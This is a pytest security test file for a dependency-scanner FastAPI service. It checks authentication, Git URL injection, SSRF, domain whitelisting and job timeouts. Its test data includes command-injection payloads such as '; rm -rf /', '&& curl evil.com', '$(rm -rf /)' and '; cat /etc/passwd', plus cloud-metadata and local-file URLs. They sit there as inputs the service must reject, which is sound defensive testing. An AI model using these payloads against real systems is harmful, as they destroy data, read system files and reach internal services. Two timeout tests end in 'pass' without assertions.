"""Security tests for the REST API endpoints."""

import pytest
import base64
from pathlib import Path
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from dependency_scanner_tool.api.app import app


@pytest.fixture
def client():
    """Create a test client for the FastAPI app."""
    return TestClient(app)


@pytest.fixture
def valid_auth_header():
    """Create valid Basic Auth header for testing."""
    # Use test credentials from environment (set in conftest.py)
    credentials = base64.b64encode(b"test_user_secure:test_password_secure_123!").decode("utf-8")
    return {"Authorization": f"Basic {credentials}"}


@pytest.fixture
def invalid_auth_header():
    """Create invalid Basic Auth header for testing."""
    credentials = base64.b64encode(b"wrong:password").decode("utf-8")
    return {"Authorization": f"Basic {credentials}"}


class TestBasicAuthentication:
    """Test HTTP Basic Authentication on all endpoints."""
    
    def test_no_default_credentials_accepted(self, client):
        """Test that default credentials are not accepted."""
        # Test common default credentials
        default_credentials = [
            ("admin", "admin"),
            ("admin", "admin1234"),
            ("admin", "secret123"),
            ("admin", "password"),
            ("api", "api"),
            ("user", "user"),
            ("test", "test"),
        ]
        
        for username, password in default_credentials:
            credentials = base64.b64encode(f"{username}:{password}".encode()).decode("utf-8")
            headers = {"Authorization": f"Basic {credentials}"}
            response = client.get("/health", headers=headers)
            # Should fail for all default credentials
            assert response.status_code == 401, f"Default credentials {username}:{password} should be rejected"
    
    def test_health_endpoint_requires_auth(self, client):
        """Test that health endpoint requires authentication."""
        response = client.get("/health")
        assert response.status_code == 401
        assert response.json()["detail"] == "Not authenticated"
    
    def test_health_endpoint_with_valid_auth(self, client, valid_auth_header):
        """Test that health endpoint works with valid authentication."""
        response = client.get("/health", headers=valid_auth_header)
        assert response.status_code == 200
    
    def test_health_endpoint_with_invalid_auth(self, client, invalid_auth_header):
        """Test that health endpoint rejects invalid authentication."""
        response = client.get("/health", headers=invalid_auth_header)
        assert response.status_code == 401
        assert response.json()["detail"] == "Invalid credentials"
    
    def test_scan_endpoint_requires_auth(self, client):
        """Test that scan endpoint requires authentication."""
        response = client.post("/scan", json={"git_url": "https://github.com/test/repo.git"})
        assert response.status_code == 401
        assert response.json()["detail"] == "Not authenticated"
    
    def test_scan_endpoint_with_valid_auth(self, client, valid_auth_header):
        """Test that scan endpoint works with valid authentication."""
        with patch('dependency_scanner_tool.api.scanner_service.scanner_service.scan_repository'):
            response = client.post(
                "/scan", 
                json={"git_url": "https://github.com/test/repo.git"},
                headers=valid_auth_header
            )
            assert response.status_code == 200
    
    def test_job_status_endpoint_requires_auth(self, client):
        """Test that job status endpoint requires authentication."""
        response = client.get("/jobs/test-job-id")
        assert response.status_code == 401
        assert response.json()["detail"] == "Not authenticated"
    
    def test_job_results_endpoint_requires_auth(self, client):
        """Test that job results endpoint requires authentication."""
        response = client.get("/jobs/test-job-id/results")
        assert response.status_code == 401
        assert response.json()["detail"] == "Not authenticated"
    
    def test_missing_auth_header(self, client):
        """Test that missing Authorization header is rejected."""
        response = client.get("/health")
        assert response.status_code == 401
        assert "WWW-Authenticate" in response.headers
        assert response.headers["WWW-Authenticate"] == "Basic"
    
    def test_malformed_auth_header(self, client):
        """Test that malformed Authorization header is rejected."""
        response = client.get("/health", headers={"Authorization": "Basic invalid_base64"})
        assert response.status_code == 401
        # FastAPI HTTPBasic handles this automatically
        assert response.json()["detail"] == "Invalid authentication credentials"


class TestGitUrlInjectionPrevention:
    """Test Git URL injection vulnerability prevention."""
    
    def test_rejects_command_injection_in_git_url(self, client, valid_auth_header):
        """Test that command injection in git URL is rejected."""
        malicious_urls = [
            "https://github.com/test/repo.git; rm -rf /",
            "https://github.com/test/repo.git && curl evil.com",
            "https://github.com/test/repo.git | bash",
            "https://github.com/test/repo.git; cat /etc/passwd",
            "file:///etc/passwd",
            "ftp://malicious.com/payload",
            "https://github.com/test/repo.git`whoami`",
            "https://github.com/test/repo.git$(rm -rf /)",
        ]
        
        for malicious_url in malicious_urls:
            response = client.post(
                "/scan", 
                json={"git_url": malicious_url},
                headers=valid_auth_header
            )
            # Should be 400 (our validation) or 422 (FastAPI validation)
            assert response.status_code in [400, 422]
            # Check that it's rejected for security reasons
            response_detail = response.json()
            if response.status_code == 400:
                assert "Invalid Git URL" in response_detail["detail"]
            else:
                # 422 from FastAPI validation
                assert "detail" in response_detail
    
    def test_accepts_valid_git_urls(self, client, valid_auth_header):
        """Test that valid Git URLs are accepted."""
        valid_urls = [
            "https://github.com/user/repo.git",
            "https://gitlab.com/user/repo.git",
            "https://bitbucket.org/user/repo.git",
            "git@github.com:user/repo.git",
            "https://github.com/user/repo-name.git",
            "https://github.com/user/repo_name.git",
        ]
        
        with patch('dependency_scanner_tool.api.scanner_service.scanner_service.scan_repository'):
            for valid_url in valid_urls:
                response = client.post(
                    "/scan", 
                    json={"git_url": valid_url},
                    headers=valid_auth_header
                )
                assert response.status_code == 200
    
    def test_rejects_local_file_paths(self, client, valid_auth_header):
        """Test that local file paths are rejected."""
        local_paths = [
            "/tmp/malicious",
            "../../../etc/passwd",
            "file:///etc/passwd",
            "C:\\Windows\\System32",
            "\\\\network\\share",
        ]
        
        for local_path in local_paths:
            response = client.post(
                "/scan", 
                json={"git_url": local_path},
                headers=valid_auth_header
            )
            # Should be 400 (our validation) or 422 (pydantic validation)
            assert response.status_code in [400, 422]
            response_detail = response.json()
            if response.status_code == 400:
                assert "Invalid Git URL" in response_detail["detail"]
            else:
                # 422 from pydantic validation
                assert "detail" in response_detail


class TestDomainWhitelistDefault:
    """Test that domain whitelist is enabled by default."""
    
    def test_domain_whitelist_enabled_by_default(self, client, valid_auth_header):
        """Test that only trusted domains are allowed by default."""
        # Test with an untrusted domain
        response = client.post(
            "/scan",
            json={"git_url": "https://malicious-domain.com/repo.git"},
            headers=valid_auth_header
        )
        assert response.status_code == 400
        assert "Domain not allowed" in response.json()["detail"]
        
        # Test with a trusted domain should work
        with patch('dependency_scanner_tool.api.scanner_service.scanner_service.scan_repository') as mock_scan:
            mock_scan.return_value = None
            response = client.post(
                "/scan",
                json={"git_url": "https://github.com/test/repo.git"},
                headers=valid_auth_header
            )
            assert response.status_code == 200


class TestSSRFVulnerabilityPrevention:
    """Test SSRF vulnerability prevention."""
    
    def test_rejects_private_network_urls(self, client, valid_auth_header):
        """Test that private network URLs are rejected."""
        private_urls = [
            "http://127.0.0.1/malicious",
            "http://localhost/malicious",
            "http://10.0.0.1/malicious",
            "http://192.168.1.1/malicious",
            "http://172.16.0.1/malicious",
            "http://169.254.169.254/metadata",  # AWS metadata
            "http://[::1]/malicious",  # IPv6 localhost
        ]
        
        for private_url in private_urls:
            response = client.post(
                "/scan", 
                json={"git_url": private_url},
                headers=valid_auth_header
            )
            # Should be 400 (our validation) or 422 (pydantic validation)
            assert response.status_code in [400, 422]
            response_detail = response.json()
            if response.status_code == 400:
                assert "Private network access not allowed" in response_detail["detail"]
            else:
                # 422 from pydantic validation
                assert "detail" in response_detail
    
    def test_rejects_metadata_endpoints(self, client, valid_auth_header):
        """Test that cloud metadata endpoints are rejected."""
        metadata_urls = [
            "http://169.254.169.254/",  # AWS
            "http://metadata.google.internal/",  # GCP
            "http://169.254.169.254/metadata/instance",  # Azure
        ]
        
        for metadata_url in metadata_urls:
            response = client.post(
                "/scan", 
                json={"git_url": metadata_url},
                headers=valid_auth_header
            )
            # Should be 400 (our validation) or 422 (pydantic validation)
            assert response.status_code in [400, 422]
            response_detail = response.json()
            if response.status_code == 400:
                assert "Metadata endpoint access not allowed" in response_detail["detail"]
            else:
                # 422 from pydantic validation
                assert "detail" in response_detail
    
    def test_rejects_non_standard_ports(self, client, valid_auth_header):
        """Test that non-standard ports are rejected."""
        non_standard_ports = [
            "http://github.com:8080/user/repo",
            "https://github.com:3000/user/repo",
            "http://example.com:22/user/repo",
            "https://example.com:1337/user/repo",
        ]
        
        for non_standard_url in non_standard_ports:
            response = client.post(
                "/scan", 
                json={"git_url": non_standard_url},
                headers=valid_auth_header
            )
            # Should be 400 (our validation) or 422 (pydantic validation)
            assert response.status_code in [400, 422]
            response_detail = response.json()
            if response.status_code == 400:
                assert "Non-standard port not allowed" in response_detail["detail"]
            else:
                # 422 from pydantic validation
                assert "detail" in response_detail


class TestResourceManagementAndCleanup:
    """Test resource management and cleanup."""
    
    def test_job_cleanup_after_completion(self, client, valid_auth_header):
        """Test that jobs are cleaned up after completion."""
        with patch('dependency_scanner_tool.api.git_service.git_service.cleanup_repository') as mock_cleanup:
            with patch('dependency_scanner_tool.api.git_service.git_service.clone_repository') as mock_clone:
                with patch('dependency_scanner_tool.api.git_service.git_service.validate_repository') as mock_validate:
                    with patch('dependency_scanner_tool.api.scanner_service.scanner_service.scanner.scan_project') as mock_scan_project:
                        # Mock successful Git operations
                        mock_clone.return_value = Path('/tmp/test_repo')
                        mock_validate.return_value = True
                        mock_scan_project.return_value = type('MockScanResult', (), {'dependencies': []})()
                        
                        # Create a job
                        response = client.post(
                            "/scan", 
                            json={"git_url": "https://github.com/test/repo.git"},
                            headers=valid_auth_header
                        )
                        job_id = response.json()["job_id"]
                        
                        # Wait a bit for background task to complete
                        import time
                        time.sleep(0.1)
                        
                        # Check that cleanup was called
                        mock_cleanup.assert_called()
    
    def test_job_cleanup_after_failure(self, client, valid_auth_header):
        """Test that jobs are cleaned up after failure."""
        with patch('dependency_scanner_tool.api.git_service.git_service.cleanup_repository') as mock_cleanup:
            with patch('dependency_scanner_tool.api.git_service.git_service.clone_repository') as mock_clone:
                with patch('dependency_scanner_tool.api.git_service.git_service.validate_repository') as mock_validate:
                    # Mock Git operations but make scanning fail
                    mock_clone.return_value = Path('/tmp/test_repo')
                    mock_validate.return_value = True
                    
                    with patch('dependency_scanner_tool.api.scanner_service.scanner_service.scanner.scan_project') as mock_scan_project:
                        mock_scan_project.side_effect = Exception("Scan failed")
                        
                        response = client.post(
                            "/scan", 
                            json={"git_url": "https://github.com/test/repo.git"},
                            headers=valid_auth_header
                        )
                        job_id = response.json()["job_id"]
                        
                        # Wait a bit for background task to complete
                        import time
                        time.sleep(0.1)
                        
                        # Check that cleanup occurs even after failure
                        mock_cleanup.assert_called()
    
    def test_maximum_concurrent_jobs_limit(self, client, valid_auth_header):
        """Test that there's a limit on concurrent jobs."""
        # Ensure the job lifecycle manager is clean
        from dependency_scanner_tool.api.job_lifecycle import job_lifecycle_manager
        job_lifecycle_manager.running_jobs.clear()
        
        # Manually register jobs to test the limit
        for i in range(5):  # Fill up the max concurrent jobs
            job_lifecycle_manager.register_job_start(f'manual_job_{i}')
        
        # Now try to create a new job - should be rate limited
        response = client.post(
            "/scan", 
            json={"git_url": "https://github.com/test/repo.git"},
            headers=valid_auth_header
        )
        
        # Should get rate limited
        assert response.status_code == 429
        assert "Too many concurrent jobs" in response.json()["detail"]
        
        # Clean up
        job_lifecycle_manager.running_jobs.clear()
    
    def test_job_timeout_cleanup(self, client, valid_auth_header):
        """Test that jobs are cleaned up after timeout."""
        with patch('dependency_scanner_tool.api.scanner_service.scanner_service.scan_repository') as mock_scan:
            # Make the scan take too long
            mock_scan.side_effect = lambda job_id, git_url: None  # Never completes
            
            response = client.post(
                "/scan", 
                json={"git_url": "https://github.com/test/repo.git"},
                headers=valid_auth_header
            )
            job_id = response.json()["job_id"]
            
            # Job should be marked as failed due to timeout
            # This test would need to be more sophisticated in real implementation
            pass


class TestTimeoutProtection:
    """Test timeout protection for all operations."""
    
    def test_git_clone_timeout(self, client, valid_auth_header):
        """Test that git clone operations have timeout protection."""
        # Test that timeout functionality exists in GitService
        from dependency_scanner_tool.api.git_service import GitService
        
        # Create a service with very short timeout for testing
        service = GitService(clone_timeout=1)  # 1 second timeout
        
        # This should work - test that the timeout mechanism is in place
        assert service.clone_timeout == 1
        assert hasattr(service, '_clone_with_timeout')
        
        # Test that the timeout wrapper exists and can be called
        import signal
        from dependency_scanner_tool.api.git_service import timeout_handler, TimeoutException
        
        # Verify timeout components exist
        assert callable(timeout_handler)
        assert TimeoutException is not None
    
    def test_scan_operation_timeout(self, client, valid_auth_header):
        """Test that scan operations have timeout protection."""
        # Test that job lifecycle timeout functionality exists
        from dependency_scanner_tool.api.job_lifecycle import JobLifecycleManager
        
        # Create a lifecycle manager with short timeout for testing
        manager = JobLifecycleManager(job_timeout=1)  # 1 second timeout
        
        # Test that timeout checking works
        assert manager.job_timeout == 1
        assert hasattr(manager, 'is_job_timed_out')
        
        # Test timeout detection
        import time
        job_id = "test_job"
        manager.register_job_start(job_id)
        
        # Initially should not be timed out
        assert not manager.is_job_timed_out(job_id)
        
        # After waiting, should be timed out
        time.sleep(1.1)
        assert manager.is_job_timed_out(job_id)
        
        # Clean up
        manager.register_job_completion(job_id)
    
    def test_job_lifecycle_timeout(self, client, valid_auth_header):
        """Test that jobs have overall lifecycle timeout."""
        with patch('dependency_scanner_tool.api.scanner_service.scanner_service.scan_repository') as mock_scan:
            # Mock a job that never completes
            mock_scan.side_effect = lambda job_id, git_url: None  # Never calls completion
            
            response = client.post(
                "/scan", 
                json={"git_url": "https://github.com/test/repo.git"},
                headers=valid_auth_header
            )
            job_id = response.json()["job_id"]
            
            # Job should be automatically marked as failed after maximum time
            # This would require a background process to check for stale jobs
            pass